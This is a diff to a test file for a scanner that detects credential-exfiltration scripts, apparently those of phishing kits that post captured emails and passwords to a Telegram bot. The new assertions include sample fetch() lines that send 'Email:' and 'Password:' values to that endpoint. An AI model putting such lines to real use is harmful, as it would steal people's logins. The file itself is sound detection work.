@@ -215,6 +215,10 @@ test('static corroboration: endpoint + an input-value read in the same script', 
   assert.equal(X.exfilCredentialScript(`fetch("${url}",{body:select.value+form.message.value})`), null, 'bare .value is not corroboration');
   assert.equal(X.exfilCredentialScript(`fetch("${url}"); var promo = "win a season pass";`), null, 'bare pass is not corroboration');
   assert.equal(X.exfilCredentialScript(`fetch("${url}"); // bypass the compass`), null, 'pass is word-bounded');
+  // a label glued to an escape sequence, the way kits build bot text
+  assert.equal(X.exfilCredentialScript(`fetch("${url}",{body:"text=Email: "+e+"\\nPassword: "+p})`), 'telegram', 'escaped newline label');
+  assert.equal(X.exfilCredentialScript(`fetch("${url}?text=Email%0APassword%3A"+p)`), 'telegram', 'url-encoded newline label');
+  assert.equal(X.exfilCredentialScript(`fetch("${url}",{body:"\\nseason pass"})`), null, 'escape prefix does not loosen pass');
 });
 
 test('isJsScriptType: only classic JS and modules are scanned', () => {
